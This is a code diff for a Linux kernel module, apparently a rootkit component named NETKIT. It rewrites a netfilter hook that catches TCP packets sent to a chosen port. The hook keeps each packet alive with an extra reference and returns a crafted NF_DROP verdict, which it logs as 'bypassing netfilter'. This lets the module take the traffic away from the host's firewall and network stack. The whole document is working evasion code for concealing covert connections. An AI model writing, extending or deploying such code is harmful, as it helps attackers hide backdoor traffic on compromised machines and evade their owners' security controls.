@@ -32,78 +32,16 @@ static struct kref active_conns;
 DECLARE_WAIT_QUEUE_HEAD(all_conns_handled_wait_queue);
 static struct task_struct *task_conn_loop = NULL;
 
-static inline unsigned int ip_hdrlen(const struct sk_buff *skb)
-{
-	return ip_hdr(skb)->ihl * 4;
-}
-
 static unsigned int hook_function(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
-{
-    struct tcphdr *tcp_header;
-    size_t content_offset;
-    size_t content_len;
-    //int (*ip_rcv_finish)(struct net*, struct sock*, struct sk_buff*);
-    
-    NETKIT_LOG("[+] lol got hooked\n");
-    if (skb->protocol != htons(ETH_P_IP) || ip_hdr(skb)->protocol != IPPROTO_TCP)
+{    
+    if (skb->protocol != htons(ETH_P_IP) || ip_hdr(skb)->protocol != IPPROTO_TCP || \
+            skb->len < ip_hdr(skb)->ihl * 4 + sizeof(struct tcphdr) || ntohs(tcp_hdr(skb)->dest) != SERVER_PORT)
         return NF_ACCEPT;
 
-    if (skb->len < ip_hdrlen(skb) + sizeof(struct tcphdr))
-    {
-        NETKIT_LOG("[!] tcp packet len is invalid for headers (len: %ld)\n", (ssize_t)skb->len);
-        return NF_ACCEPT;
-    }
-
-    tcp_header = tcp_hdr(skb);
-    if (ntohs(tcp_header->dest) != SERVER_PORT)
-        return NF_ACCEPT;  // let other people handle it
-
-    content_offset = ip_hdrlen(skb) + tcp_hdrlen(skb);
-    if (skb->len < content_offset)
-    {
-        NETKIT_LOG("[!] tcp packet len is invalid for offset\n");
-        return NF_ACCEPT;
-    }
-
-/*
-static inline int NF_DROP_GETERR(int verdict)
-{
-	return -(verdict >> NF_VERDICT_QBITS (16));
-}
-
-    switch (verdict & NF_VERDICT_MASK) 
-    {
-    	case NF_DROP:
-			kfree_skb_reason(skb,
-					 SKB_DROP_REASON_NETFILTER_DROP);
-			ret = NF_DROP_GETERR(verdict);
-			if (ret == 0)
-				ret = -EPERM;
-			return ret;
-    }
-*/
-
-    content_len = skb->len - content_offset;
-    NETKIT_LOG("[*] packet content length: %ld, skb->len: %ld, ip hdr len: %d, tcp hdr len: %d\n", (ssize_t)content_len, (ssize_t)skb->len, ip_hdrlen(skb), tcp_hdrlen(skb));
-
-    
-    NETKIT_LOG("[+] skrrrt (net: %px, socket: %px, sk_buff: %px\n", state->net, state->sk, skb);
-    // static int ip_rcv_finish(struct net *net, struct sock *sk, struct sk_buff *skb)
-
-    /*rcu_read_unlock();
-    ip_rcv_finish = (int(*)(struct net*, struct sock*, struct sk_buff*))sym_lookup("ip_rcv_finish");
-    ip_rcv_finish(state->net, state->sk, skb);
-    rcu_read_lock();
-    //print_hex_dump(KERN_ERR, "", DUMP_PREFIX_ADDRESS, 16, 1, skb->data + content_offset, content_len, true);
-    //
-    return NF_STOLEN;*/
-
-    // refcount incr &skb->users so it won't get free'd
+    NETKIT_LOG("[*] bypassing netfilter...\n");
 
     refcount_inc(&skb->users);
     return NF_DROP | (0xFFFF << 16);
-    //return NF_DROP | ((1 << 31) + (1 << 30) + (1 << 29) + (1 << 28) + (1 << 27) + (1 << 26) + (1 << 25) + (1 << 24) + (1 << 23) + (1 << 22) + (1 << 21) + (1 << 20) + (1 << 19) + (1 << 18) + (1 << 17) + (1 << 16));
-
 }
 
 static struct nf_hook_ops nfho = {
